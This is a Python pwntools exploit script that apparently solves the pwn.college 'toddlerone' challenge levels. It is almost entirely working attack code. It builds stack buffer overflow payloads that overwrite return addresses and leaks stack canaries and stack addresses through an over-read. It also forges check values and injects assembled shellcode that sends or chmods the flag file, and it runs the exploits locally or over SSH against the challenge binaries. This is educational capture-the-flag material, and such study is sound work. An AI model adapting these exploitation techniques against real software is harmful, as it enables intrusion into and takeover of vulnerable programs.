import pwn
import sys

pwn.context.log_level = 'error'
pwn.context.terminal = ['kitty']

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/toddlerone_level{self.level}"
        self.local_process = f"binaries/toddlerone_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]

def level1_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7ffc4754f318
    bufaddr = 0x7ffc4754f2e0
    shcaddr = 0x18c04000

    payload = b"A" * (retaddr - bufaddr)
    payload += pwn.p64(shcaddr)
    payload_length = len(payload)

    shellcode = get_shellcode('sendfile.s')

    p.sendafter(b"shellcode from stdin.\n\n", shellcode)
    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendlineafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level1_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7ffc9dd46898
    bufaddr = 0x7ffc9dd46820
    shcaddr = 0x20c78000

    payload = b"A" * (retaddr - bufaddr)
    payload += pwn.p64(shcaddr)
    payload_length = len(payload)

    shellcode = get_shellcode('sendfile.s')

    p.sendafter(b"shellcode from stdin.\n\n", shellcode)
    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendlineafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level2_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffaa18
    bufaddr = 0x7fffffffa9c0
    shcaddr = bufaddr

    shellcode = get_shellcode('sendfile.s')

    payload = b"\x90"*8
    payload += shellcode
    payload += b"A" * (retaddr - bufaddr - len(payload))
    payload += pwn.p64(shcaddr)
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level2_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffd2b8
    bufaddr = 0x7fffffffd270
    shcaddr = retaddr+16

    shellcode = get_shellcode('sendfile.s')

    payload = b"A" * (retaddr - bufaddr)
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", b"200")
    print(p.sendafter(b"bytes)!\n", payload).decode())
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level3_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8f8
    bufaddr = 0x7fffffffa8a0

    # The offset between the 2nd round buffer and extracted stack address
    new_buf_offset = 0x7ffe45a8d450 - 0x7ffe45a8c300

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=0x7fff6cf49500,
                    readaddr=0x7fff6cf49558+1,
                    num_bytes=7+6)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (canaddr - bufaddr)
    payload += canary
    payload += b"B"*8
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", b"200")
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level3_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8f8
    bufaddr = 0x7fffffffa8b0

    # The offset between the 2nd round buffer and extracted stack address
    new_buf_offset = 0x7fffffffb940 - 0x7fffffffa810

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=7+6)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    print(f"Canary: {canary.hex()}")
    print(f"Stack Addr: {stackaddr.hex()}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (canaddr - bufaddr)
    payload += canary
    payload += b"B"*8
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", b"200")
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level4_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8f8
    bufaddr = 0x7fffffffa890
    chk = 0x18c2989858e3cd1f
    chkaddr = 0x7fffffffa8f0

    # The offset between the 2nd round buffer and extracted stack address
    new_buf_offset = 0x7fffffffb940 - 0x7fffffffa7d0

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=7+6)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    print(f"Canary: {canary.hex()}")
    print(f"Stack Addr: {stackaddr.hex()}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (chkaddr - bufaddr)
    payload += pwn.p64(chk)
    payload += canary
    payload += b"B"*8
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Continuing execution.\n")
    print(p.recvline().decode())

def level4_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8e8
    bufaddr = 0x7fffffffa8b0
    chk = 0x4a6fb1126219f9e3
    chkaddr = 0x7fffffffa8e8

    # The offset between the 2nd round buffer and extracted stack address
    new_buf_offset = 0x7fffffffb940 - 0x7fffffffa7d0

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=7+6)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    print(f"Canary: {canary.hex()}")
    print(f"Stack Addr: {stackaddr.hex()}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (chkaddr - bufaddr)
    payload += pwn.p64(chk)
    payload += b"B"*8
    payload += canary
    payload += b"C"*8
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Continuing execution.\n")
    print(p.recvline().decode())

def level5_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8e8
    bufaddr = 0x7fffffffa8b0
    chk = 0x18b8802a666e2ada
    chkaddr = 0x7fffffffa8d0

    # The offset between the final round buffer and extracted stack address
    new_buf_offset = 0x7fffffffba68 - 0x7fffffffa750

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr-8,
                    num_bytes=6)
    stackaddr = data[:6] + b'\0\0'
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=7)
    canary = b'\0' + data

    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")
    print(f"Canary: {hex(pwn.u64(canary))}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (chkaddr - bufaddr)
    payload += pwn.p64(chk)
    payload += b"B" * (canaddr - chkaddr - 8)
    payload += canary
    payload += b"C" * (retaddr - canaddr - 8)
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Continuing execution.\n")
    print(p.recvline().decode())

def level5_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8f8
    bufaddr = 0x7fffffffa870
    chk = 0xd9521f22499f821
    chkaddr = 0x7fffffffa8e8

    # The offset between the final round buffer and extracted stack address
    new_buf_offset = 0x7fffffffb940 - 0x7fffffffa780

    shellcode = get_shellcode('sendfile.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=6+7)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")
    print(f"Canary: {hex(pwn.u64(canary))}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (chkaddr - bufaddr)
    payload += pwn.p64(chk)
    payload += b"B" * (canaddr - chkaddr - 8)
    payload += canary
    payload += b"C" * (retaddr - canaddr - 8)
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level6_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa908
    canaddr = 0x7fffffffa8e8
    bufaddr = 0x7fffffffa870
    scpaddr = 0x7fffffffa8d8

    # The offset between the final round buffer and extracted stack address
    new_buf_offset = 0x7fffffffba68 - 0x7fffffffa690

    shellcode = get_shellcode('chmod.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr-8,
                    num_bytes=6)
    stackaddr = data[:6] + b'\0\0'
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=7)
    canary = b'\0' + data

    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")
    print(f"Canary: {hex(pwn.u64(canary))}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (scpaddr - bufaddr)
    payload += b"\x01\0\0\0\x5a\0\0\0"
    payload += b"B" * (canaddr - scpaddr - 8)
    payload += canary
    payload += b"C" * (retaddr - canaddr - 8)
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.interactive()
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())

def level6_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    retaddr = 0x7fffffffa978
    canaddr = 0x7fffffffa968
    bufaddr = 0x7fffffffa920
    scpaddr = 0x7fffffffa954

    # The offset between the final round buffer and extracted stack address
    new_buf_offset = 0x7fffffffb9b0 - 0x7fffffffa870

    shellcode = get_shellcode('chmod.s')

    # Extract the canary, plus an address pointing to a stack location
    data = arb_read(level, p,
                    bufaddr=bufaddr,
                    readaddr=canaddr+1,
                    num_bytes=6+7)
    canary = b'\0' + data[:7]
    stackaddr = data[7:] + b'\0\0'

    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")
    print(f"Canary: {hex(pwn.u64(canary))}")

    # Set the shellcode address to be just after the new return address
    shcaddr = pwn.u64(stackaddr) - new_buf_offset + (retaddr-bufaddr) + 8

    payload = b"A" * (scpaddr - bufaddr)
    payload += b"\x01\0\0\0\x5a\0\0\0"
    payload += b"B" * (canaddr - scpaddr - 8)
    payload += canary
    payload += b"C" * (retaddr - canaddr - 8)
    payload += pwn.p64(shcaddr)
    payload += b"\x90"*8
    payload += shellcode
    payload_length = len(payload)

    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", payload)
    p.interactive()
    p.recvuntil(b"Goodbye!\n")
    print(p.recvline().decode())


def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

def get_shellcode(asm_file):
    assembly = []
    with open(asm_file, 'r') as f:
        for line in f.readlines():
            assembly.append(line.split('#')[0].rstrip())

    return pwn.asm('\n'.join(assembly))

def arb_read(level, p, bufaddr, readaddr, num_bytes=8, canary=None, canaddr=None):
    init_payload = b"REPEAT"
    init_payload += b"A" * (readaddr-bufaddr-len("REPEAT"))

    payload_length = len(init_payload)
    p.sendlineafter(b"size: ", str(payload_length).encode())
    p.sendafter(b"bytes)!\n", init_payload)
    #p.send(init_payload)
    p.recvuntil(init_payload)
    return p.recv(num_bytes)

if __name__ == '__main__':
    if len(sys.argv) == 3 and sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        p = pwn.process(level.local_process, aslr=False)

    elif len(sys.argv) >= 4 and sys.argv[1] == 'dbg':
        level = Level(sys.argv[2])
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        p = pwn.gdb.debug(level.local_process, gdbscript=gdbscript, stdin=pwn.PTY, stdout=pwn.PTY, aslr=False)

    elif sys.argv[1] == 'remote':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = r.process(level.remote_process)

    elif sys.argv[1] == 'local':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = pwn.process(f"binaries/toddlerone_level{level.level}")

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    with p:
        level.run(level, p)

